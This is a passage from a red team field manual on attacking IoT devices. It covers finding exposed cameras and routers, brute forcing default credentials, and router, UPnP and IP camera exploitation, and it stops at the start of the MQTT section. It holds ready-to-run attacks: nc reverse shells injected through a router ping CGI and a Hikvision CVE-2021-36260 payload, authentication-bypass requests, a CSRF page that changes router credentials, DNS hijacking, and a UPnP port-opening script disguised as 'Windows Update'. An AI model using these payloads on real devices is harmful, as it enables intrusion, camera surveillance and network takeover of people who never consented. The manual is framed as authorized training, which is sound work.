# IoT & Embedded Systems Pentesting — Red Team Field Manual
### Firmware Analysis | UART/JTAG | Router Exploitation | IP Cameras | MQTT | BLE | RouterSploit

> **Series Position:** Module 11
> Cross-references: `Ports_Protocols_RedTeam_Field_Manual.md` (Telnet port 23, SNMP port 161, network service exploitation), `Network_Pivoting_Tunneling_RedTeam_Field_Manual.md` (pivoting through embedded devices), `Web_Application_Security_RedTeam_Field_Manual.md` (web admin interfaces on routers/cameras).
>
> **Red Team Lens:** IoT devices are the **forgotten attack surface** in most enterprise environments. Printers, cameras, routers, HVAC controllers, badge readers — all network-connected, all running embedded Linux or RTOS, all with default credentials, rarely patched, rarely monitored. In red team engagements, a compromised IP camera or router often gives you a persistent pivot point that blue teams never check.
>
> **Lab Disclaimer:** All techniques are for authorized environments — your own devices, purpose-built vulnerable firmware (Damn Vulnerable Router Firmware, FirmAE emulation, IoTGoat), or authorized penetration tests with explicit written scope covering IoT devices.

---

## Table of Contents

### PART 1 — IoT ATTACK SURFACE & MINDSET
1. [The IoT Threat Model — Why Embedded Devices Are Different](#1-the-iot-threat-model)
2. [IoT Attack Surface Map](#2-iot-attack-surface-map)
3. [Lab Setup — Emulation & Physical Testing](#3-lab-setup--emulation--physical-testing)

### PART 2 — NETWORK-LEVEL ATTACKS (No Hardware Needed)
4. [Finding IoT Devices — Shodan, Censys, Nmap](#4-finding-iot-devices)
5. [Default Credentials — The #1 IoT Vulnerability](#5-default-credentials)
6. [Router Web Interface Attacks](#6-router-web-interface-attacks)
7. [Telnet & SSH on Embedded Devices](#7-telnet--ssh-on-embedded-devices)
8. [SNMP on Routers & Network Gear](#8-snmp-on-routers--network-gear)
9. [UPnP Exploitation](#9-upnp-exploitation)
10. [RTSP & IP Camera Attacks](#10-rtsp--ip-camera-attacks)
11. [MQTT — IoT Messaging Protocol](#11-mqtt--iot-messaging-protocol)
12. [RouterSploit — The Metasploit for Routers](#12-routersploit)

### PART 3 — FIRMWARE ANALYSIS
13. [What Firmware Is & How to Get It](#13-what-firmware-is--how-to-get-it)
14. [Binwalk — Firmware Extraction & Analysis](#14-binwalk--firmware-extraction--analysis)
15. [Filesystem Analysis — Finding Secrets in Firmware](#15-filesystem-analysis--finding-secrets-in-firmware)
16. [Emulating Firmware with FirmAE & QEMU](#16-emulating-firmware-with-firmae--qemu)
17. [Static Analysis of Embedded Binaries (Ghidra)](#17-static-analysis-of-embedded-binaries-ghidra)

### PART 4 — HARDWARE INTERFACES
18. [UART — Serial Console Access](#18-uart--serial-console-access)
19. [JTAG & SWD — Debug Interface Exploitation](#19-jtag--swd--debug-interface-exploitation)
20. [SPI/I2C — Flash Chip Extraction](#20-spii2c--flash-chip-extraction)
21. [Reading & Writing Flash with Flashrom](#21-reading--writing-flash-with-flashrom)

### PART 5 — WIRELESS PROTOCOLS
22. [Zigbee Security & Attacks](#22-zigbee-security--attacks)
23. [Bluetooth Low Energy (BLE) Attacks](#23-bluetooth-low-energy-ble-attacks)
24. [Z-Wave Security](#24-z-wave-security)

### PART 6 — INDUSTRIAL PROTOCOLS
25. [Modbus — Industrial Control Systems](#25-modbus--industrial-control-systems)
26. [DNP3 & ICS/SCADA Security](#26-dnp3--icsscada-security)

### PART 7 — SPECIFIC TARGET CLASSES
27. [SOHO Router Exploitation — Full Chain](#27-soho-router-exploitation--full-chain)
28. [IP Camera Exploitation — Full Chain](#28-ip-camera-exploitation--full-chain)
29. [Smart Home Device Attacks](#29-smart-home-device-attacks)
30. [Printers — The Forgotten Attack Surface](#30-printers--the-forgotten-attack-surface)

### PART 8 — POST-EXPLOITATION ON EMBEDDED DEVICES
31. [Persistence on Routers & Embedded Linux](#31-persistence-on-routers--embedded-linux)
32. [Using Routers as Pivot Points](#32-using-routers-as-pivot-points)
33. [Exfiltration Through IoT Devices](#33-exfiltration-through-iot-devices)

### PART 9 — OPSEC & DETECTION
34. [What IoT Attacks Leave Behind](#34-what-iot-attacks-leave-behind)
35. [IoT Hardening Checklist](#35-iot-hardening-checklist)

---

# PART 1 — IoT ATTACK SURFACE & MINDSET

---

## 1. The IoT Threat Model — Why Embedded Devices Are Different

### Layman's Terms
A regular server gets patched every month, has endpoint detection, has logs shipped to SIEM, has IT admins watching it. An IP camera or SOHO router gets plugged in **once** and forgotten for 5 years. It has default credentials. It runs a Linux kernel from 2016 that nobody patched. It's on the corporate network. It can see traffic. It has a shell. And nobody is watching it. That's the IoT threat model.

### Real-World Event
**The Mirai Botnet (2016)** — the largest DDoS in history at the time (1.1 Tbps against Dyn DNS, taking down Twitter, Netflix, Reddit, GitHub simultaneously). Mirai compromised **600,000+ IoT devices** (cameras, DVRs, routers) using a list of **61 default username/password combinations**. The entire attack was built on default credentials. No exploits. No zero-days. Just `admin:admin`.

**The Verkada Camera Breach (2021)** — attackers gained access to 150,000 surveillance cameras inside hospitals, prisons, Tesla factories, and Cloudflare offices. Root access obtained through a super admin account with default credentials left in a customer network. They could see inside ICUs, psychiatric wards, women's shelters. The entry point: a camera admin interface.

### Why IoT Is Different from Traditional IT

```
TRADITIONAL IT vs IoT:

PATCHING:
  Traditional: Monthly patch cycles, automated updates, version tracking
  IoT:         Vendor stops releasing firmware after 2 years
               Users don't know how to update (most never do)
               Update requires physical access or web interface
               Many devices → hundreds of unpatched CVEs outstanding

MONITORING:
  Traditional: EDR, SIEM, netflow, WAF, DLP — all watching
  IoT:         Zero monitoring. Not in SIEM. Not in asset inventory.
               Logs → go nowhere. Alerts → nobody reads them.
               Security team doesn't know the device exists.

AUTHENTICATION:
  Traditional: MFA, SSO, certificate auth, password managers
  IoT:         admin:admin. root:root. admin:password.
               Hardcoded credentials in firmware (cannot change).
               Shared credentials across ALL devices of same model.

CRYPTOGRAPHY:
  Traditional: TLS 1.3, AES-256, certificate pinning
  IoT:         HTTP admin panel. Self-signed cert. RC4. Or nothing.
               Private keys hardcoded in firmware.
               Same TLS private key on every unit of same model.

COMPUTE RESOURCES:
  Traditional: GBs of RAM, GHz of CPU, storage for logging
  IoT:         8MB flash, 32MB RAM, 200MHz MIPS processor
               Cannot run AV/EDR. Cannot store logs.
               Minimal OS (BusyBox, OpenWRT, proprietary RTOS)

ATTACK VALUE:
  Not just the device — it's:
  → A persistent foothold on the network
  → A pivot point to reach internal systems
  → A traffic capture point (network-level man-in-the-middle)
  → A launch point for DDoS (the Mirai lesson)
  → Access to physical systems (cameras, access control, HVAC)
```

---

## 2. IoT Attack Surface Map

```
IoT ATTACK SURFACE:

┌─────────────────────────────────────────────────────────────────┐
│                     IoT DEVICE                                  │
│                                                                 │
│  NETWORK INTERFACES:          PHYSICAL INTERFACES:             │
│  ├── Ethernet (RJ45)          ├── UART (serial console)        │
│  ├── Wi-Fi (802.11)           ├── JTAG (debug interface)       │
│  ├── Bluetooth/BLE            ├── SWD (ARM debug)              │
│  ├── Zigbee                   ├── SPI (flash chip)             │
│  ├── Z-Wave                   ├── I2C (sensors/config)         │
│  └── Cellular (4G/5G LTE)     └── USB (sometimes shell!)       │
│                                                                 │
│  NETWORK SERVICES:            FIRMWARE/SOFTWARE:               │
│  ├── HTTP/HTTPS admin UI      ├── Linux kernel (often old)     │
│  ├── Telnet (:23)             ├── BusyBox (coreutils)          │
│  ├── SSH (:22)                ├── Hardcoded credentials        │
│  ├── SNMP (:161)              ├── Compiled binaries (ARM/MIPS) │
│  ├── RTSP (:554) - cameras    ├── Web server (lighttpd/httpd)  │
│  ├── MQTT (:1883)             ├── Encryption keys in firmware  │
│  ├── Modbus (:502) - ICS      ├── Debug symbols left in        │
│  ├── UPnP (:1900 UDP)         └── Command injection in CGI     │
│  └── mDNS/Bonjour             CLOUD CONNECTION:                │
│                               ├── C2 to vendor cloud           │
│  UPDATE MECHANISM:            ├── May expose local API         │
│  ├── HTTP download            └── OAuth tokens stored locally  │
│  ├── No signature check                                        │
│  └── No encryption                                             │
└─────────────────────────────────────────────────────────────────┘

ATTACK ENTRY POINTS (most to least common):
  1. Default/weak credentials on web admin interface
  2. Default/weak credentials on Telnet/SSH
  3. Command injection in web admin CGI scripts
  4. Known CVEs in outdated firmware (unpatched routers)
  5. UART console access (physical)
  6. Hardcoded backdoor accounts in firmware
  7. Buffer overflow in network-facing services
  8. JTAG debug interface (physical)
  9. Flash chip extraction (physical)
  10. Supply chain (compromised firmware from vendor)
```

---

## 3. Lab Setup — Emulation & Physical Testing

### Emulation Lab (No Hardware Needed)

```bash
# ── OPTION 1: FirmAE — Firmware Emulation ────────────────────────
# FirmAE can emulate firmware from major router vendors
# Runs actual firmware in QEMU
# https://github.com/pr0v3rbs/FirmAE

# Install FirmAE:
git clone --recursive https://github.com/pr0v3rbs/FirmAE
cd FirmAE
./setup.sh

# Download vulnerable firmware for practice:
# Netgear R6200 (known vulnerable): https://kb.netgear.com/000060566
# TP-Link TL-WR940N: download from TP-Link website
# D-Link DIR-615 (command injection): download from D-Link

# Run firmware in FirmAE:
sudo python3 run.py -r 192.168.0.1 netgear_r6200_firmware.zip NETGEAR
# Emulates Netgear router at 192.168.0.1
# Expected output:
# Setting up network...
# Extracting filesystem...
# Starting services...
# Web interface available at http://192.168.0.1/

# ── OPTION 2: IoTGoat — Purpose-Built Vulnerable Firmware ─────────
# Like DVWA but for IoT
# https://github.com/OWASP/IoTGoat
# Based on OpenWRT with intentional vulnerabilities

# Download IoTGoat:
wget https://github.com/OWASP/IoTGoat/releases/download/v1.0/IoTGoat-raspberry-pi2.img
# Run in QEMU:
qemu-system-arm -M raspi2 -kernel IoTGoat-raspberry-pi2.img -nographic

# ── OPTION 3: Docker-based Router Simulation ──────────────────────
# Damn Vulnerable Router Firmware (DVRF):
git clone https://github.com/praetorian-inc/DVRF
cd DVRF
# Contains stack overflow challenges for ARM/MIPS firmware practice

# ── OPTION 4: Physical Hardware Lab (Best) ────────────────────────
# Cheap devices for pentesting (< $30 each):
# TP-Link TL-WR841N    ← UART accessible, many CVEs
# D-Link DIR-615       ← Command injection in admin panel
# Netgear WNR1000      ← Known authentication bypass
# GL.iNet GL-AR150     ← OpenWRT based, great for learning
# Any Hikvision camera ← Default creds, many CVEs

# Network setup for physical testing:
# [Kali] ── Ethernet ── [Test Router] ── [Target Device]
# Kali: 192.168.1.50
# Router: 192.168.1.1 (your test router, not production!)
# Target devices on 192.168.1.0/24
```

### Essential Tools for IoT Pentesting

```bash
# Install all IoT pentesting tools on Kali:
sudo apt update && sudo apt install -y \
  binwalk \          # Firmware analysis
  firmwalker \       # Filesystem analysis
  qemu-system-arm \  # ARM emulation
  qemu-system-mips \ # MIPS emulation
  qemu-user-static \ # User-space QEMU (run ARM/MIPS binaries)
  python3-pip \
  mosquitto-clients \ # MQTT client
  nmap \
  metasploit-framework

# Python tools:
pip3 install routersploit flashrom

# RouterSploit:
git clone https://github.com/threat9/routersploit
cd routersploit && pip3 install -r requirements.txt
python3 rsf.py

# Firmwalker (filesystem secret hunter):
git clone https://github.com/craigz28/firmwalker

# FirmAE (emulation):
git clone --recursive https://github.com/pr0v3rbs/FirmAE

# Ghidra (firmware reverse engineering):
# Download from: https://ghidra-sre.org/
# Has ARM, MIPS, PowerPC support built-in

# UART tools:
sudo apt install minicom screen picocom
# USB-to-TTL adapter needed for physical work ($3-10)

# Bluetooth tools:
sudo apt install bluez bluetooth
pip3 install bleak gattlib
```

---

# PART 2 — NETWORK-LEVEL ATTACKS

---

## 4. Finding IoT Devices — Shodan, Censys, Nmap

### Layman's Terms
Before attacking IoT, you need to **find it**. On an engagement, IoT devices are often invisible in asset inventories. Your job is to discover them on the network and on the internet.

```bash
# ── SHODAN — FIND INTERNET-EXPOSED IoT ───────────────────────────
# Shodan is the IoT search engine — indexes internet-accessible devices
# Account: shodan.io (free for basic searches)

# Shodan CLI:
pip3 install shodan
shodan init YOUR_API_KEY

# Search for exposed cameras by brand:
shodan search 'product:"Hikvision" port:80'
shodan search 'product:"Dahua" port:80 country:US'
shodan search '"Server: IP Camera" country:US'

# Search for routers:
shodan search 'product:"Netgear" port:80'
shodan search '"WR841N" port:80'
shodan search 'linksys port:80 "remote management"'

# Search for exposed RTSP streams:
shodan search 'port:554 has_screenshot:true'

# Search for MQTT brokers (often unauthenticated!):
shodan search 'port:1883'
shodan search 'product:"mosquitto" port:1883'

# Search for Modbus (industrial devices on internet!):
shodan search 'port:502'

# Search for specific vulnerabilities:
shodan search 'vuln:CVE-2021-41773'  # Apache path traversal
shodan search 'http.favicon.hash:-335242539'  # Hikvision cameras

# Download results:
shodan search --fields ip_str,port,org,product 'port:554 has_screenshot:true' > cameras.txt

# ── NMAP — FIND IoT ON INTERNAL NETWORK ──────────────────────────
# Discover all devices on internal network:
sudo nmap -sn 192.168.1.0/24 -oG hosts.txt
grep "Up" hosts.txt | awk '{print $2}' > live_hosts.txt

# IoT-specific port scan:
sudo nmap -sV -p 23,80,443,554,1883,8080,8443,161 \
  -iL live_hosts.txt --open -oN iot_scan.txt
# Port 23   = Telnet (often on old routers/cameras)
# Port 554  = RTSP (IP cameras)
# Port 1883 = MQTT (IoT messaging)
# Port 161  = SNMP (network gear)

# OS/device type fingerprinting:
sudo nmap -O -sV --osscan-guess 192.168.1.0/24 | grep -E "Device type|Running|OS CPE"
# Expected for router: "Device type: router | Running: Linux 2.6"
# Expected for camera: "Device type: webcam | Running: embedded"

# Identify camera streams:
sudo nmap -p 554 --script rtsp-url-brute 192.168.1.0/24
# Brute-forces common RTSP paths to find streams

# ── MASSCAN — FAST IoT DISCOVERY ─────────────────────────────────
# Much faster than nmap for large networks:
sudo masscan -p 23,80,443,554,1883,8080 192.168.0.0/16 --rate 1000
# 1000 packets/sec — adjust rate for your network
```

---

## 5. Default Credentials — The #1 IoT Vulnerability

### Layman's Terms
Before running any exploit, try the defaults. In real engagements and in Mirai's playbook, **default credentials work embarrassingly often**. The question isn't whether to try them — it's having the right list.

```bash
# ── CREDENTIAL DATABASES ──────────────────────────────────────────
# Online resources:
# https://www.routerpasswords.com/   ← Router-specific defaults
# https://www.cirt.net/passwords     ← General IoT defaults
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/

# ── COMMON IoT DEFAULT CREDENTIALS ───────────────────────────────
# These are the Mirai botnet's 61 credential pairs — still relevant:
cat << 'EOF' > /tmp/iot_defaults.txt
root:root
root:admin
root:password
root:(blank)
admin:admin
admin:password
admin:1234
admin:12345
admin:admin123
admin:(blank)
user:user
support:support
guest:guest
service:service
supervisor:supervisor
ubnt:ubnt
pi:raspberry
ftp:ftp
anonymous:(blank)
Administrator:admin
Administrator:password
EOF

# ── ROUTER-SPECIFIC DEFAULTS ──────────────────────────────────────
# Netgear: admin:password, admin:1234
# TP-Link: admin:admin, admin:(blank)
# D-Link: admin:admin, admin:(blank), Admin:Admin
# Linksys: admin:admin, (blank):admin
# ASUS: admin:admin
# Huawei: admin:admin, telecomadmin:admintelecom
# Zyxel: admin:1234, admin:admin
# MikroTik: admin:(blank)
# Ubiquiti: ubnt:ubnt
# Cisco home: (blank):admin, cisco:cisco

# ── CAMERA DEFAULTS ────────────────────────────────────────────────
# Hikvision: admin:12345, admin:(blank)
# Dahua: admin:admin, admin:(blank)
# Axis: root:pass, root:(blank)
# Bosch: service:service
# Samsung: admin:4321, admin:samsung

# ── AUTOMATED CREDENTIAL TESTING ─────────────────────────────────
# HTTP basic auth:
hydra -C /tmp/iot_defaults.txt http-get://192.168.1.1/ -t 4 -V

# HTTP form-based:
hydra -C /tmp/iot_defaults.txt 192.168.1.1 http-post-form \
  "/userRpm/LoginRpm.htm:username=^USER^&password=^PASS^&Save=Save:Error"

# Telnet:
hydra -C /tmp/iot_defaults.txt telnet://192.168.1.1 -t 4 -V

# SSH:
hydra -C /tmp/iot_defaults.txt ssh://192.168.1.1 -t 4 -V

# ── ROUTERSPLOIT DEFAULT CRED SCANNER ─────────────────────────────
python3 rsf.py
# rsf > use scanners/autopwn
# rsf (AutoPwn) > set TARGET 192.168.1.1
# rsf (AutoPwn) > run
# Auto-tests all known exploits AND default credentials!
```

---

## 6. Router Web Interface Attacks

### Layman's Terms
Every consumer router has a web admin panel — usually at 192.168.1.1 or 192.168.0.1. These panels run CGI scripts or embedded web servers that are often vulnerable to **command injection, authentication bypass, CSRF, and path traversal**. Thousands of CVEs exist in these panels, and patches are rarely applied.

```bash
# ── AUTHENTICATION BYPASS ─────────────────────────────────────────

# Netgear Authentication Bypass (CVE-2017-5521):
# Many Netgear routers expose unauth endpoint that reveals password:
curl http://192.168.1.1/passwordrecovered.cgi?id=anything
# Expected on vulnerable model:
# PasswordRecovered
# admin password: P@ssw0rd123!  ← Cleartext admin password!

# D-Link Authentication Bypass (multiple CVEs):
# Some D-Link routers skip auth if User-Agent is set to:
curl -A "xmlset_roodkcableoj28840ybtide" http://192.168.1.1/
# "edit_y0840jaLebkcoordteeelsmxy" = "editby Joel's backdoor"!
# Some models grant admin access with this User-Agent header

# Netgear DGN CVE-2014-9583:
curl "http://192.168.1.1/setup.cgi?todo=debug"
# Returns debug info on vulnerable models

# ── COMMAND INJECTION IN CGI ──────────────────────────────────────
# Many router CGI scripts pass user input directly to shell commands
# Test in ping/traceroute/nslookup fields in web UI:

# In URL parameter (ping functionality):
# http://192.168.1.1/ping.cgi?ip=8.8.8.8;id

# Using curl to test directly:
curl "http://192.168.1.1/ping.cgi?ip=8.8.8.8;id" \
  -b "admin_cookie=your_session"
# Expected if vulnerable:
# PING 8.8.8.8: 56 data bytes
# uid=0(root)    ← Command injection working as root!

# Full reverse shell via command injection:
# Listener on Kali: nc -lvnp 4444
curl "http://192.168.1.1/ping.cgi?ip=;rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+10.10.10.50+4444+>/tmp/f"
# Expected: root shell from router!

# ── CSRF ON ROUTER ADMIN PANEL ────────────────────────────────────
# If admin is logged into router panel and visits malicious page:
cat > /tmp/router_csrf.html << 'EOF'
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="http://192.168.1.1/userRpm/PPPoECfgRpm.htm">
    <input name="wan_pppoe_user" value="attacker">
    <input name="wan_pppoe_pwd" value="newpassword">
    <input name="Save" value="Save">
  </form>
</body>
</html>
EOF
# When admin visits this page → router credentials changed!

# ── DNS HIJACKING THROUGH ROUTER ──────────────────────────────────
# If you have router admin access → change DNS servers
# All devices using router DNS → get attacker's DNS → traffic redirect

# Via curl (TP-Link example):
curl -u admin:admin \
  "http://192.168.1.1/cgi-bin/cgi?sendpage=/dnscfg.htm&action=set&dns1=10.10.10.50&dns2=8.8.8.8"
# Now all DNS queries go to your machine first!
# Set up dnsmasq on Kali to serve malicious responses

# ── NMAP ROUTER SCRIPTS ────────────────────────────────────────────
sudo nmap -p 80 --script http-default-accounts,http-auth-finder,\
http-form-brute,http-config-backup 192.168.1.1
# http-config-backup: checks for common backup file paths
# Expected: finds config.cfg.bak or backup.bin with credentials!
```

---

## 7. Telnet & SSH on Embedded Devices

```bash
# ── TELNET (CLEARTEXT PROTOCOL) ───────────────────────────────────
# Many IoT devices (especially older ones) run Telnet
# Everything is cleartext — capture with tcpdump

# Connect manually:
telnet 192.168.1.1
# When prompted: try default credentials

# Check what shell you get:
# $ id
# uid=0(root) gid=0(root)   ← Usually root on IoT devices!
# $ cat /proc/version
# Linux 2.6.36 (MIPS)       ← Kernel info
# $ ls /
# bin dev etc lib mnt proc sys tmp usr var  ← BusyBox filesystem

# Capture cleartext Telnet creds on network:
sudo tcpdump -i eth0 -A port 23 | grep -E "login:|Password:"

# ── SSH ON EMBEDDED DEVICES ───────────────────────────────────────
# Older/cheaper devices use weak SSH keys or no host key verification

# Check SSH version:
nc 192.168.1.1 22
# Expected: SSH-2.0-dropbear_2015.71   ← Old dropbear version!
# Check CVEs: searchsploit dropbear 2015

# Dropbear (embedded SSH):
# Common on: DD-WRT, OpenWRT, many commercial routers
# Vulnerabilities: buffer overflows in older versions
searchsploit dropbear

# Check for weak DSA keys (common on embedded devices):
ssh-keyscan 192.168.1.1 2>/dev/null | ssh-keygen -l -f -
# 1024-bit DSA keys are cryptographically weak!

# ── BUSYBOX SHELL COMMANDS (after access) ─────────────────────────
# BusyBox is the embedded Linux Swiss Army knife
# Provides minimal versions of common commands

# Check what's available:
busybox --list    # All commands BusyBox provides
ls /bin /usr/bin  # Available binaries

# Network info:
ifconfig          # Network interfaces
netstat -tlnp     # Listening ports
cat /etc/hosts    # Host file
route             # Routing table

# Find credentials:
cat /etc/passwd   # User list
cat /etc/shadow   # Password hashes (if readable)
cat /etc/config/  # Router config files
find / -name "*.conf" 2>/dev/null | head -20

# Process list:
ps | grep -v "\[" # Running processes

# Check mounts (find interesting filesystems):
mount
cat /proc/mounts
```

---

## 8. SNMP on Routers & Network Gear

> **Reference:** Full SNMP mechanism, enumeration, and exploitation covered in `Ports_Protocols_RedTeam_Field_Manual.md` Section 12. IoT-specific context here:

```bash
# SNMP v1/v2c with community string "public" is extremely common
# on network devices — gives read access to device configuration

# Enumerate router via SNMP:
snmpwalk -v2c -c public 192.168.1.1

# Get specific info:
# System description (firmware version!):
snmpget -v2c -c public 192.168.1.1 1.3.6.1.2.1.1.1.0
# Expected: Linksys WRT54G 4.71.1, Sep 2006

# Interfaces (all network interfaces):
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.2.2.1.2
# Expected: eth0, ath0 (wireless), lo

# Get routing table:
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21

# Get ARP table (all devices router has seen!):
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.22
# Expected: IP → MAC mapping of all connected devices
# This reveals ALL clients on the network!

# SNMP write (if private community string works):
snmpset -v2c -c private 192.168.1.1 \
  SNMPv2-MIB::sysContact.0 s "hacked@attacker.com"
# If this works: write access confirmed — can reconfigure device!
```

---

## 9. UPnP Exploitation

### Layman's Terms
UPnP (Universal Plug and Play) lets devices automatically configure themselves on a network — like a smart device asking the router "please open port 8080 for me." The problem: **UPnP often has no authentication**, accepts requests from internal hosts, and can be exploited to open ports in your router's firewall (allowing external connections to internal services).

```bash
# ── DISCOVER UPnP DEVICES ─────────────────────────────────────────
# UPnP discovery via SSDP (UDP 1900):
python3 -c "
import socket, struct

# SSDP M-SEARCH message
msg = b'M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:2\r\nMAN:\"ssdp:discover\"\r\n\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.settimeout(3)
s.sendto(msg, ('239.255.255.250', 1900))
while True:
    try:
        data, addr = s.recvfrom(65507)
        print(f'Device found at {addr[0]}:')
        print(data.decode('utf-8', errors='ignore'))
        print()
    except socket.timeout:
        break
"
# Expected: list of UPnP-capable devices (routers, printers, media servers)

# ── MIRANDA — UPnP EXPLOITATION TOOL ─────────────────────────────
pip3 install miranda
# Or: git clone https://github.com/traviscross/mrouterd (alternative)

miranda
# msearch              ← Discover UPnP devices
# host list            ← Show discovered hosts
# host get 0           ← Get details on first host
# host info 0 WANIPConn1 ← WANIPConnection service info

# ── EXPLOIT: ADD PORT MAPPING (OPEN FIREWALL HOLE) ────────────────
# This adds a port forward rule to the router:
# External port 4444 → Your internal machine:4444
# Attacker outside can now connect to your internal machine!

python3 << 'EOF'
import requests
from urllib.parse import urljoin

# First discover the UPnP endpoint:
upnp_base = "http://192.168.1.1:49152/"  # Found via SSDP
control_url = "/upnp/control/WANIPConn1"  # Control endpoint

# SOAP request to add port mapping:
soap_action = '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"'
soap_body = """<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost>
<NewExternalPort>4444</NewExternalPort>
<NewProtocol>TCP</NewProtocol>
<NewInternalPort>4444</NewInternalPort>
<NewInternalClient>192.168.1.50</NewInternalClient>
<NewEnabled>1</NewEnabled>
<NewPortMappingDescription>Windows Update</NewPortMappingDescription>
<NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>"""

resp = requests.post(
    upnp_base + control_url.lstrip('/'),
    headers={"SOAPAction": soap_action, "Content-Type": "text/xml"},
    data=soap_body
)
print(f"Response: {resp.status_code}")
print(resp.text)
# Expected: <errorCode>0</errorCode> = port mapping added!
# External attackers can now reach 192.168.1.50:4444 through the router!
EOF

# ── CALLSTRANGER (CVE-2020-12695) ─────────────────────────────────
# UPnP SUBSCRIBE callback vulnerability
# Allows: SSRF, DDoS amplification, bypass firewalls
# Affects: Millions of devices globally
# Check tool: https://github.com/yunuscadirci/CallStranger
python3 callstranger.py -u http://192.168.1.1:1900/
```

---

## 10. RTSP & IP Camera Attacks

### Layman's Terms
IP cameras stream video over RTSP (Real-Time Streaming Protocol) on port 554. Many cameras require no authentication for their video stream, or use default credentials. Once you have access to the stream — or to the camera's admin panel — you can **view live video, access stored footage, extract credentials, and use the camera as a network pivot**.

```bash
# ── DISCOVER RTSP STREAMS ─────────────────────────────────────────
# Nmap RTSP discovery:
sudo nmap -p 554 --open 192.168.1.0/24
sudo nmap -p 554 --script rtsp-url-brute 192.168.1.100
# rtsp-url-brute: tries common RTSP paths
# Expected:
# /cam/realmonitor       ← Dahua path
# /h264/ch1/main/av_stream  ← Hikvision path
# /live.sdp              ← Common generic path
# /video1                ← Simple path

# ── COMMON RTSP PATHS BY VENDOR ────────────────────────────────────
# Hikvision:
# rtsp://192.168.1.100/Streaming/Channels/101  (main stream)
# rtsp://192.168.1.100/Streaming/Channels/102  (sub stream)
# Dahua:
# rtsp://192.168.1.100/cam/realmonitor?channel=1&subtype=0
# Axis:
# rtsp://192.168.1.100/axis-media/media.amp
# Generic:
# rtsp://192.168.1.100/
# rtsp://192.168.1.100/live.sdp
# rtsp://192.168.1.100/video1
# rtsp://192.168.1.100/h264

# ── ACCESS RTSP STREAM ────────────────────────────────────────────
# With VLC (easy):
vlc rtsp://admin:12345@192.168.1.100/Streaming/Channels/101
# Credentials: admin:12345 (Hikvision default!)

# Without auth (many streams unauthenticated):
vlc rtsp://192.168.1.100/live.sdp

# With ffmpeg (capture frames):
ffmpeg -rtsp_transport tcp -i rtsp://admin:12345@192.168.1.100/stream1 \
  -frames:v 1 camera_snapshot.jpg
# Saves single frame as JPEG

# Continuous recording:
ffmpeg -rtsp_transport tcp -i rtsp://admin:12345@192.168.1.100/stream1 \
  -c copy -t 60 recording.mp4
# Record 60 seconds

# ── HIKVISION SPECIFIC ATTACKS ────────────────────────────────────

# CVE-2021-36260 — Unauthenticated RCE in Hikvision cameras (CRITICAL 9.8):
# No credentials needed! Command injection in web interface
# Affects: Most Hikvision cameras running firmware < 5.5.800
curl -X PUT "http://192.168.1.100/SDK/webLanguage" \
  --header "Content-Length: 68" \
  --data '<?xml version="1.0" encoding="UTF-8"?><language>$(reboot)</language>'
# Device reboots = confirmed RCE!

# Get reverse shell:
curl -X PUT "http://192.168.1.100/SDK/webLanguage" \
  --header "Content-Length: 200" \
  --data '<?xml version="1.0" encoding="UTF-8"?><language>$(busybox nc 10.10.10.50 4444 -e sh)</language>'
# Expected: shell from camera as root!

# PoC tool (more reliable):
git clone https://github.com/Alonzozzz/alonzohikvisionrce
python3 hikvision-rce.py -t 192.168.1.100 -c "id"
# Expected: uid=0(root)

# CVE-2017-7921 — Hikvision Authentication Bypass:
# Direct access to user list without authentication:
curl "http://192.168.1.100/Security/users?auth=YWRtaW46MTEM"
# base64 decode: admin:1TEM  ← this specific encoded value bypasses auth!
# Expected: full user list with hashed passwords

# ── ONVIF — IP CAMERA MANAGEMENT PROTOCOL ────────────────────────
# ONVIF is standard protocol for IP camera management
# Uses SOAP/XML over HTTP, often on port 80 or 8080

pip3 install onvif-zeep
python3 << 'EOF'
from onvif import ONVIFCamera

# Connect to camera with admin creds:
cam = ONVIFCamera('192.168.1.100', 80, 'admin', '12345')

# Get camera info:
devicemgmt = cam.create_devicemgmt_service()
info = devicemgmt.GetDeviceInformation()
print(f"Manufacturer: {info.Manufacturer}")
print(f"Model: {info.Model}")
print(f"Firmware: {info.FirmwareVersion}")

# Get all network interfaces:
interfaces = devicemgmt.GetNetworkInterfaces()
for iface in interfaces:
    print(f"Interface: {iface.Info.Name}, MAC: {iface.Info.HwAddress}")

# Get RTSP stream URI:
media = cam.create_media_service()
profiles = media.GetProfiles()
for profile in profiles:
    uri_request = media.create_type('GetStreamUri')
    uri_request.ProfileToken = profile.token
    uri_request.StreamSetup = {'Stream': 'RTP-Unicast', 'Transport': {'Protocol': 'RTSP'}}
    uri = media.GetStreamUri(uri_request)
    print(f"Stream URI: {uri.Uri}")
    # Expected: rtsp://192.168.1.100/Streaming/Channels/101
EOF

# ── SNAPSHOT WITHOUT AUTH (common misconfig) ──────────────────────
# Many cameras expose snapshot endpoint without authentication:
curl http://192.168.1.100/cgi-bin/snapshot.cgi > snapshot.jpg
curl http://192.168.1.100/Streaming/Channels/1/picture > snapshot.jpg
curl http://192.168.1.100/snapshot.jpg > snapshot.jpg
curl http://192.168.1.100/image/jpeg.cgi > snapshot.jpg
```

---

## 11. MQTT — IoT Messaging Protocol

### Layman's Terms
MQTT (Message Queuing Telemetry Transport) is the **WhatsApp for IoT devices** — lightweight messaging where devices publish data to topics and others subscribe to receive it. Smart homes, industrial sensors, connected vehicles all use MQTT. When it has no authentication (extremely common), **anyone can read all messages from all devices and send commands to any device**.

```bash
# ── DISCOVER MQTT BROKERS ─────────────────────────────────────────
# Shodan: port:1883
# Nmap:
